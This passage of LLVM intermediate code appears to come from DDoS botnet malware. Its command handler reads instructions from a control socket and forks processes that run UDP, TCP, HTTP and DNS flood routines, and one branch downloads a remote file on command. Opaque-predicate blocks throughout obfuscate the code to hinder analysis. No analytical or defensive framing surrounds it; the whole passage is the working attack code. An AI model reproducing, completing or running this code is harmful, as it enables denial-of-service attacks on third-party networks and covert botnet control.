  %610 = load i32, i32* %13, align 4
  %611 = load i32, i32* %14, align 4
  %612 = load i32, i32* %15, align 4
  %613 = load i32, i32* %16, align 4
  %614 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %607, i32 %608, i32 %609, i32 %610, i32 %611, i32 %612, i32 %613, i32 %614)
  call void @_exit(i32 0) #12
  unreachable

; <label>:615:                                    ; preds = %603
  br label %616

; <label>:616:                                    ; preds = %615, %602
  br label %1784

; <label>:617:                                    ; preds = %306
  %618 = load i8**, i8*** %4, align 8
  %619 = getelementptr inbounds i8*, i8** %618, i64 0
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 @strcmp(i8* %620, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.457, i32 0, i32 0)) #10
  %622 = icmp ne i32 %621, 0
  br i1 %622, label %826, label %623

; <label>:623:                                    ; preds = %617
  %624 = load i32, i32* %3, align 4
  %625 = icmp slt i32 %624, 6
  br i1 %625, label %684, label %626

; <label>:626:                                    ; preds = %623
  %627 = load i8**, i8*** %4, align 8
  %628 = getelementptr inbounds i8*, i8** %627, i64 3
  %629 = load i8*, i8** %628, align 8
  %630 = call i32 @atoi(i8* %629) #10
  %631 = icmp eq i32 %630, -1
  br i1 %631, label %684, label %632

; <label>:632:                                    ; preds = %626
  %633 = load i8**, i8*** %4, align 8
  %634 = getelementptr inbounds i8*, i8** %633, i64 2
  %635 = load i8*, i8** %634, align 8
  %636 = call i32 @atoi(i8* %635) #10
  %637 = icmp eq i32 %636, -1
  br i1 %637, label %684, label %638

; <label>:638:                                    ; preds = %632
  %639 = load i32, i32* @x.119
  %640 = load i32, i32* @y.120
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %638
  %647 = load i8**, i8*** %4, align 8
  %648 = getelementptr inbounds i8*, i8** %647, i64 4
  %649 = load i8*, i8** %648, align 8
  %650 = call i32 @atoi(i8* %649) #10
  %651 = icmp eq i32 %650, -1
  %652 = load i32, i32* @x.119
  %653 = load i32, i32* @y.120
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %651, label %684, label %660

; <label>:660:                                    ; preds = %originalBBpart264
  %661 = load i8**, i8*** %4, align 8
  %662 = getelementptr inbounds i8*, i8** %661, i64 4
  %663 = load i8*, i8** %662, align 8
  %664 = call i32 @atoi(i8* %663) #10
  %665 = icmp sgt i32 %664, 32
  br i1 %665, label %684, label %666

; <label>:666:                                    ; preds = %660
  %667 = load i32, i32* %3, align 4
  %668 = icmp sgt i32 %667, 6
  br i1 %668, label %669, label %675

; <label>:669:                                    ; preds = %666
  %670 = load i8**, i8*** %4, align 8
  %671 = getelementptr inbounds i8*, i8** %670, i64 6
  %672 = load i8*, i8** %671, align 8
  %673 = call i32 @atoi(i8* %672) #10
  %674 = icmp slt i32 %673, 0
  br i1 %674, label %684, label %675

; <label>:675:                                    ; preds = %669, %666
  %676 = load i32, i32* %3, align 4
  %677 = icmp eq i32 %676, 8
  br i1 %677, label %678, label %687

; <label>:678:                                    ; preds = %675
  %679 = load i8**, i8*** %4, align 8
  %680 = getelementptr inbounds i8*, i8** %679, i64 7
  %681 = load i8*, i8** %680, align 8
  %682 = call i32 @atoi(i8* %681) #10
  %683 = icmp slt i32 %682, 1
  br i1 %683, label %684, label %687

; <label>:684:                                    ; preds = %678, %669, %660, %originalBBpart264, %632, %626, %623
  %685 = load i32, i32* @mainCommSock, align 4
  %686 = call i32 (i32, i8*, ...) @sockprintf(i32 %685, i8* getelementptr inbounds ([186 x i8], [186 x i8]* @.str.458, i32 0, i32 0))
  br label %1784

; <label>:687:                                    ; preds = %678, %675
  %688 = load i8**, i8*** %4, align 8
  %689 = getelementptr inbounds i8*, i8** %688, i64 1
  %690 = load i8*, i8** %689, align 8
  store i8* %690, i8** %19, align 8
  %691 = load i8**, i8*** %4, align 8
  %692 = getelementptr inbounds i8*, i8** %691, i64 2
  %693 = load i8*, i8** %692, align 8
  %694 = call i32 @atoi(i8* %693) #10
  store i32 %694, i32* %20, align 4
  %695 = load i8**, i8*** %4, align 8
  %696 = getelementptr inbounds i8*, i8** %695, i64 3
  %697 = load i8*, i8** %696, align 8
  %698 = call i32 @atoi(i8* %697) #10
  store i32 %698, i32* %21, align 4
  %699 = load i8**, i8*** %4, align 8
  %700 = getelementptr inbounds i8*, i8** %699, i64 4
  %701 = load i8*, i8** %700, align 8
  %702 = call i32 @atoi(i8* %701) #10
  store i32 %702, i32* %22, align 4
  %703 = load i8**, i8*** %4, align 8
  %704 = getelementptr inbounds i8*, i8** %703, i64 5
  %705 = load i8*, i8** %704, align 8
  store i8* %705, i8** %23, align 8
  %706 = load i32, i32* %3, align 4
  %707 = icmp eq i32 %706, 8
  br i1 %707, label %708, label %713

; <label>:708:                                    ; preds = %687
  %709 = load i8**, i8*** %4, align 8
  %710 = getelementptr inbounds i8*, i8** %709, i64 7
  %711 = load i8*, i8** %710, align 8
  %712 = call i32 @atoi(i8* %711) #10
  br label %730

; <label>:713:                                    ; preds = %687
  %714 = load i32, i32* @x.119
  %715 = load i32, i32* @y.120
  %716 = sub i32 %714, 1
  %717 = mul i32 %714, %716
  %718 = urem i32 %717, 2
  %719 = icmp eq i32 %718, 0
  %720 = icmp slt i32 %715, 10
  %721 = or i1 %719, %720
  br i1 %721, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %713
  %722 = load i32, i32* @x.119
  %723 = load i32, i32* @y.120
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %730

; <label>:730:                                    ; preds = %originalBBpart268, %708
  %731 = phi i32 [ %712, %708 ], [ 10, %originalBBpart268 ]
  store i32 %731, i32* %24, align 4
  %732 = load i32, i32* %3, align 4
  %733 = icmp sgt i32 %732, 6
  br i1 %733, label %734, label %739

; <label>:734:                                    ; preds = %730
  %735 = load i8**, i8*** %4, align 8
  %736 = getelementptr inbounds i8*, i8** %735, i64 6
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @atoi(i8* %737) #10
  br label %756

; <label>:739:                                    ; preds = %730
  %740 = load i32, i32* @x.119
  %741 = load i32, i32* @y.120
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %739
  %748 = load i32, i32* @x.119
  %749 = load i32, i32* @y.120
  %750 = sub i32 %748, 1
  %751 = mul i32 %748, %750
  %752 = urem i32 %751, 2
  %753 = icmp eq i32 %752, 0
  %754 = icmp slt i32 %749, 10
  %755 = or i1 %753, %754
  br i1 %755, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %756

; <label>:756:                                    ; preds = %originalBBpart272, %734
  %757 = phi i32 [ %738, %734 ], [ 0, %originalBBpart272 ]
  store i32 %757, i32* %25, align 4
  %758 = load i8*, i8** %19, align 8
  %759 = call i8* @strstr(i8* %758, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %760 = icmp ne i8* %759, null
  br i1 %760, label %761, label %813

; <label>:761:                                    ; preds = %756
  %762 = load i8*, i8** %19, align 8
  %763 = call i8* @strtok(i8* %762, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %763, i8** %26, align 8
  br label %764

; <label>:764:                                    ; preds = %794, %761
  %765 = load i8*, i8** %26, align 8
  %766 = icmp ne i8* %765, null
  br i1 %766, label %767, label %796

; <label>:767:                                    ; preds = %764
  %768 = load i32, i32* @x.119
  %769 = load i32, i32* @y.120
  %770 = sub i32 %768, 1
  %771 = mul i32 %768, %770
  %772 = urem i32 %771, 2
  %773 = icmp eq i32 %772, 0
  %774 = icmp slt i32 %769, 10
  %775 = or i1 %773, %774
  br i1 %775, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %767
  %776 = call i32 @listFork()
  %777 = icmp ne i32 %776, 0
  %778 = load i32, i32* @x.119
  %779 = load i32, i32* @y.120
  %780 = sub i32 %778, 1
  %781 = mul i32 %778, %780
  %782 = urem i32 %781, 2
  %783 = icmp eq i32 %782, 0
  %784 = icmp slt i32 %779, 10
  %785 = or i1 %783, %784
  br i1 %785, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %777, label %794, label %786

; <label>:786:                                    ; preds = %originalBBpart276
  %787 = load i8*, i8** %26, align 8
  %788 = load i32, i32* %20, align 4
  %789 = load i32, i32* %21, align 4
  %790 = load i32, i32* %22, align 4
  %791 = load i8*, i8** %23, align 8
  %792 = load i32, i32* %25, align 4
  %793 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %787, i32 %788, i32 %789, i32 %790, i8* %791, i32 %792, i32 %793)
  call void @_exit(i32 0) #12
  unreachable

; <label>:794:                                    ; preds = %originalBBpart276
  %795 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %795, i8** %26, align 8
  br label %764

; <label>:796:                                    ; preds = %764
  %797 = load i32, i32* @x.119
  %798 = load i32, i32* @y.120
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %796
  %805 = load i32, i32* @x.119
  %806 = load i32, i32* @y.120
  %807 = sub i32 %805, 1
  %808 = mul i32 %805, %807
  %809 = urem i32 %808, 2
  %810 = icmp eq i32 %809, 0
  %811 = icmp slt i32 %806, 10
  %812 = or i1 %810, %811
  br i1 %812, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %825

; <label>:813:                                    ; preds = %756
  %814 = call i32 @listFork()
  %815 = icmp ne i32 %814, 0
  br i1 %815, label %824, label %816

; <label>:816:                                    ; preds = %813
  %817 = load i8*, i8** %19, align 8
  %818 = load i32, i32* %20, align 4
  %819 = load i32, i32* %21, align 4
  %820 = load i32, i32* %22, align 4
  %821 = load i8*, i8** %23, align 8
  %822 = load i32, i32* %25, align 4
  %823 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %817, i32 %818, i32 %819, i32 %820, i8* %821, i32 %822, i32 %823)
  call void @_exit(i32 0) #12
  unreachable

; <label>:824:                                    ; preds = %813
  br label %825

; <label>:825:                                    ; preds = %824, %originalBBpart280
  br label %826

; <label>:826:                                    ; preds = %825, %617
  %827 = load i32, i32* @x.119
  %828 = load i32, i32* @y.120
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %826
  %835 = load i8**, i8*** %4, align 8
  %836 = getelementptr inbounds i8*, i8** %835, i64 0
  %837 = load i8*, i8** %836, align 8
  %838 = call i32 @strcmp(i8* %837, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0)) #10
  %839 = icmp ne i32 %838, 0
  %840 = load i32, i32* @x.119
  %841 = load i32, i32* @y.120
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %839, label %1005, label %848

; <label>:848:                                    ; preds = %originalBBpart284
  %849 = load i32, i32* @x.119
  %850 = load i32, i32* @y.120
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %848
  %857 = load i32, i32* %3, align 4
  %858 = icmp slt i32 %857, 6
  %859 = load i32, i32* @x.119
  %860 = load i32, i32* @y.120
  %861 = sub i32 %859, 1
  %862 = mul i32 %859, %861
  %863 = urem i32 %862, 2
  %864 = icmp eq i32 %863, 0
  %865 = icmp slt i32 %860, 10
  %866 = or i1 %864, %865
  br i1 %866, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %858, label %867, label %870

; <label>:867:                                    ; preds = %originalBBpart288
  %868 = load i32, i32* @mainCommSock, align 4
  %869 = call i32 (i32, i8*, ...) @sockprintf(i32 %868, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.460, i32 0, i32 0))
  br label %1784

; <label>:870:                                    ; preds = %originalBBpart288
  %871 = load i32, i32* @x.119
  %872 = load i32, i32* @y.120
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %870
  %879 = load i8**, i8*** %4, align 8
  %880 = getelementptr inbounds i8*, i8** %879, i64 1
  %881 = load i8*, i8** %880, align 8
  %882 = call i8* @strstr(i8* %881, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %883 = icmp ne i8* %882, null
  %884 = load i32, i32* @x.119
  %885 = load i32, i32* @y.120
  %886 = sub i32 %884, 1
  %887 = mul i32 %884, %886
  %888 = urem i32 %887, 2
  %889 = icmp eq i32 %888, 0
  %890 = icmp slt i32 %885, 10
  %891 = or i1 %889, %890
  br i1 %891, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %883, label %892, label %929

; <label>:892:                                    ; preds = %originalBBpart292
  %893 = load i8**, i8*** %4, align 8
  %894 = getelementptr inbounds i8*, i8** %893, i64 1
  %895 = load i8*, i8** %894, align 8
  %896 = call i8* @strtok(i8* %895, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %896, i8** %27, align 8
  br label %897

; <label>:897:                                    ; preds = %926, %892
  %898 = load i8*, i8** %27, align 8
  %899 = icmp ne i8* %898, null
  br i1 %899, label %900, label %928

; <label>:900:                                    ; preds = %897
  %901 = call i32 @listFork()
  %902 = icmp ne i32 %901, 0
  br i1 %902, label %926, label %903

; <label>:903:                                    ; preds = %900
  %904 = load i8**, i8*** %4, align 8
  %905 = getelementptr inbounds i8*, i8** %904, i64 1
  %906 = load i8*, i8** %905, align 8
  %907 = load i8**, i8*** %4, align 8
  %908 = getelementptr inbounds i8*, i8** %907, i64 2
  %909 = load i8*, i8** %908, align 8
  %910 = load i8**, i8*** %4, align 8
  %911 = getelementptr inbounds i8*, i8** %910, i64 3
  %912 = load i8*, i8** %911, align 8
  %913 = call i32 @atoi(i8* %912) #10
  %914 = trunc i32 %913 to i16
  %915 = load i8**, i8*** %4, align 8
  %916 = getelementptr inbounds i8*, i8** %915, i64 4
  %917 = load i8*, i8** %916, align 8
  %918 = load i8**, i8*** %4, align 8
  %919 = getelementptr inbounds i8*, i8** %918, i64 5
  %920 = load i8*, i8** %919, align 8
  %921 = call i32 @atoi(i8* %920) #10
  %922 = load i8**, i8*** %4, align 8
  %923 = getelementptr inbounds i8*, i8** %922, i64 6
  %924 = load i8*, i8** %923, align 8
  %925 = call i32 @atoi(i8* %924) #10
  call void @sendHTTP(i8* %906, i8* %909, i16 zeroext %914, i8* %917, i32 %921, i32 %925)
  call void @_exit(i32 0) #12
  unreachable

; <label>:926:                                    ; preds = %900
  %927 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %927, i8** %27, align 8
  br label %897

; <label>:928:                                    ; preds = %897
  br label %988

; <label>:929:                                    ; preds = %originalBBpart292
  %930 = load i32, i32* @x.119
  %931 = load i32, i32* @y.120
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %929
  %938 = call i32 @listFork()
  %939 = icmp ne i32 %938, 0
  %940 = load i32, i32* @x.119
  %941 = load i32, i32* @y.120
  %942 = sub i32 %940, 1
  %943 = mul i32 %940, %942
  %944 = urem i32 %943, 2
  %945 = icmp eq i32 %944, 0
  %946 = icmp slt i32 %941, 10
  %947 = or i1 %945, %946
  br i1 %947, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %939, label %948, label %965

; <label>:948:                                    ; preds = %originalBBpart296
  %949 = load i32, i32* @x.119
  %950 = load i32, i32* @y.120
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %948
  %957 = load i32, i32* @x.119
  %958 = load i32, i32* @y.120
  %959 = sub i32 %957, 1
  %960 = mul i32 %957, %959
  %961 = urem i32 %960, 2
  %962 = icmp eq i32 %961, 0
  %963 = icmp slt i32 %958, 10
  %964 = or i1 %962, %963
  br i1 %964, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %1784

; <label>:965:                                    ; preds = %originalBBpart296
  %966 = load i8**, i8*** %4, align 8
  %967 = getelementptr inbounds i8*, i8** %966, i64 1
  %968 = load i8*, i8** %967, align 8
  %969 = load i8**, i8*** %4, align 8
  %970 = getelementptr inbounds i8*, i8** %969, i64 2
  %971 = load i8*, i8** %970, align 8
  %972 = load i8**, i8*** %4, align 8
  %973 = getelementptr inbounds i8*, i8** %972, i64 3
  %974 = load i8*, i8** %973, align 8
  %975 = call i32 @atoi(i8* %974) #10
  %976 = trunc i32 %975 to i16
  %977 = load i8**, i8*** %4, align 8
  %978 = getelementptr inbounds i8*, i8** %977, i64 4
  %979 = load i8*, i8** %978, align 8
  %980 = load i8**, i8*** %4, align 8
  %981 = getelementptr inbounds i8*, i8** %980, i64 5
  %982 = load i8*, i8** %981, align 8
  %983 = call i32 @atoi(i8* %982) #10
  %984 = load i8**, i8*** %4, align 8
  %985 = getelementptr inbounds i8*, i8** %984, i64 6
  %986 = load i8*, i8** %985, align 8
  %987 = call i32 @atoi(i8* %986) #10
  call void @sendHTTP(i8* %968, i8* %971, i16 zeroext %976, i8* %979, i32 %983, i32 %987)
  call void @_exit(i32 0) #12
  unreachable

; <label>:988:                                    ; preds = %928
  %989 = load i32, i32* @x.119
  %990 = load i32, i32* @y.120
  %991 = sub i32 %989, 1
  %992 = mul i32 %989, %991
  %993 = urem i32 %992, 2
  %994 = icmp eq i32 %993, 0
  %995 = icmp slt i32 %990, 10
  %996 = or i1 %994, %995
  br i1 %996, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %988
  %997 = load i32, i32* @x.119
  %998 = load i32, i32* @y.120
  %999 = sub i32 %997, 1
  %1000 = mul i32 %997, %999
  %1001 = urem i32 %1000, 2
  %1002 = icmp eq i32 %1001, 0
  %1003 = icmp slt i32 %998, 10
  %1004 = or i1 %1002, %1003
  br i1 %1004, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %1005

; <label>:1005:                                   ; preds = %originalBBpart2104, %originalBBpart284
  %1006 = load i32, i32* @x.119
  %1007 = load i32, i32* @y.120
  %1008 = sub i32 %1006, 1
  %1009 = mul i32 %1006, %1008
  %1010 = urem i32 %1009, 2
  %1011 = icmp eq i32 %1010, 0
  %1012 = icmp slt i32 %1007, 10
  %1013 = or i1 %1011, %1012
  br i1 %1013, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %1005
  %1014 = load i8**, i8*** %4, align 8
  %1015 = getelementptr inbounds i8*, i8** %1014, i64 0
  %1016 = load i8*, i8** %1015, align 8
  %1017 = call i32 @strcmp(i8* %1016, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i32 0, i32 0)) #10
  %1018 = icmp ne i32 %1017, 0
  %1019 = load i32, i32* @x.119
  %1020 = load i32, i32* @y.120
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %1018, label %1155, label %1027

; <label>:1027:                                   ; preds = %originalBBpart2108
  %1028 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %1028, i32* %28, align 4
  %1029 = icmp slt i32 %1028, 0
  br i1 %1029, label %1030, label %1047

; <label>:1030:                                   ; preds = %1027
  %1031 = load i32, i32* @x.119
  %1032 = load i32, i32* @y.120
  %1033 = sub i32 %1031, 1
  %1034 = mul i32 %1031, %1033
  %1035 = urem i32 %1034, 2
  %1036 = icmp eq i32 %1035, 0
  %1037 = icmp slt i32 %1032, 10
  %1038 = or i1 %1036, %1037
  br i1 %1038, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %1030
  call void @exit(i32 1) #14
  %1039 = load i32, i32* @x.119
  %1040 = load i32, i32* @y.120
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  unreachable

; <label>:1047:                                   ; preds = %1027
  %1048 = load i32, i32* %3, align 4
  %1049 = icmp slt i32 %1048, 6
  br i1 %1049, label %1050, label %1053

; <label>:1050:                                   ; preds = %1047
  %1051 = load i32, i32* @mainCommSock, align 4
  %1052 = call i32 (i32, i8*, ...) @sockprintf(i32 %1051, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.462, i32 0, i32 0))
  call void @exit(i32 0) #14
  unreachable

; <label>:1053:                                   ; preds = %1047
  %1054 = call i32 @listFork()
  %1055 = icmp ne i32 %1054, 0
  br i1 %1055, label %1154, label %1056

; <label>:1056:                                   ; preds = %1053
  %1057 = load i32, i32* @x.119
  %1058 = load i32, i32* @y.120
  %1059 = sub i32 %1057, 1
  %1060 = mul i32 %1057, %1059
  %1061 = urem i32 %1060, 2
  %1062 = icmp eq i32 %1061, 0
  %1063 = icmp slt i32 %1058, 10
  %1064 = or i1 %1062, %1063
  br i1 %1064, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1056
  %1065 = call i64 @time(i64* null) #2
  %1066 = trunc i64 %1065 to i32
  call void @srand(i32 %1066) #2
  %1067 = load i8**, i8*** %4, align 8
  %1068 = getelementptr inbounds i8*, i8** %1067, i64 4
  %1069 = load i8*, i8** %1068, align 8
  %1070 = call i32 @atoi(i8* %1069) #10
  store i32 %1070, i32* %29, align 4
  %1071 = load i8**, i8*** %4, align 8
  %1072 = getelementptr inbounds i8*, i8** %1071, i64 5
  %1073 = load i8*, i8** %1072, align 8
  %1074 = call i32 @atoi(i8* %1073) #10
  store i32 %1074, i32* %30, align 4
  store i32 0, i32* %32, align 4
  %1075 = load i8**, i8*** %4, align 8
  %1076 = getelementptr inbounds i8*, i8** %1075, i64 3
  %1077 = load i8*, i8** %1076, align 8
  %1078 = call i32 @download(i8* %1077, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0))
  %1079 = load i32, i32* @mainCommSock, align 4
  %1080 = load i8**, i8*** %4, align 8
  %1081 = getelementptr inbounds i8*, i8** %1080, i64 1
  %1082 = load i8*, i8** %1081, align 8
  %1083 = load i8**, i8*** %4, align 8
  %1084 = getelementptr inbounds i8*, i8** %1083, i64 2
  %1085 = load i8*, i8** %1084, align 8
  %1086 = load i8**, i8*** %4, align 8
  %1087 = getelementptr inbounds i8*, i8** %1086, i64 6
  %1088 = load i8*, i8** %1087, align 8
  %1089 = call i32 @atoi(i8* %1088) #10
  %1090 = load i8**, i8*** %4, align 8
  %1091 = getelementptr inbounds i8*, i8** %1090, i64 5
  %1092 = load i8*, i8** %1091, align 8
  %1093 = call i32 @atoi(i8* %1092) #10
  %1094 = call i32 (i32, i8*, ...) @sockprintf(i32 %1079, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i32 0, i32 0), i8* %1082, i8* %1085, i32 %1089, i32 %1093)
  %1095 = load i32, i32* %29, align 4
  %1096 = zext i32 %1095 to i64
  %1097 = call i8* @llvm.stacksave()
  store i8* %1097, i8** %33, align 8
  %1098 = alloca %struct.thread_data, i64 %1096, align 16
  store i32 0, i32* %31, align 4
  %1099 = load i32, i32* @x.119
  %1100 = load i32, i32* @y.120
  %1101 = sub i32 %1099, 1
  %1102 = mul i32 %1099, %1101
  %1103 = urem i32 %1102, 2
  %1104 = icmp eq i32 %1103, 0
  %1105 = icmp slt i32 %1100, 10
  %1106 = or i1 %1104, %1105
  br i1 %1106, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1107

; <label>:1107:                                   ; preds = %1149, %originalBBpart2116
  %1108 = load i32, i32* %31, align 4
  %1109 = load i32, i32* %29, align 4
  %1110 = icmp slt i32 %1108, %1109
  br i1 %1110, label %1111, label %1152

; <label>:1111:                                   ; preds = %1107
  %1112 = load i32, i32* %31, align 4
  %1113 = load i32, i32* %31, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1098, i64 %1114
  %1116 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1115, i32 0, i32 0
  store i32 %1112, i32* %1116, align 16
  %1117 = load i8**, i8*** %4, align 8
  %1118 = getelementptr inbounds i8*, i8** %1117, i64 1
  %1119 = load i8*, i8** %1118, align 8
  %1120 = load i32, i32* %31, align 4
  %1121 = sext i32 %1120 to i64
  %1122 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1098, i64 %1121
  %1123 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1122, i32 0, i32 1
  store i8* %1119, i8** %1123, align 8
  %1124 = load i8**, i8*** %4, align 8
  %1125 = getelementptr inbounds i8*, i8** %1124, i64 2
  %1126 = load i8*, i8** %1125, align 8
  %1127 = call i32 @atoi(i8* %1126) #10
  %1128 = load i32, i32* %31, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1098, i64 %1129
  %1131 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1130, i32 0, i32 2
  store i32 %1127, i32* %1131, align 16
  %1132 = load i32, i32* %32, align 4
  %1133 = load i32, i32* %31, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1098, i64 %1134
  %1136 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1135, i32 0, i32 3
  store i32 %1132, i32* %1136, align 4
  %1137 = load i8**, i8*** %4, align 8
  %1138 = getelementptr inbounds i8*, i8** %1137, i64 6
  %1139 = load i8*, i8** %1138, align 8
  %1140 = call i32 @atoi(i8* %1139) #10
  %1141 = load i32, i32* %31, align 4
  %1142 = sext i32 %1141 to i64
  %1143 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1098, i64 %1142
  %1144 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1143, i32 0, i32 4
  store i32 %1140, i32* %1144, align 8
  %1145 = load i32, i32* %31, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %1098, i64 %1146
  %1148 = bitcast %struct.thread_data* %1147 to i8*
  call void @dnsflood(i8* %1148)
  br label %1149

; <label>:1149:                                   ; preds = %1111
  %1150 = load i32, i32* %31, align 4
  %1151 = add nsw i32 %1150, 1
  store i32 %1151, i32* %31, align 4
  br label %1107

; <label>:1152:                                   ; preds = %1107
  %1153 = load i8*, i8** %33, align 8
  call void @llvm.stackrestore(i8* %1153)
  br label %1154

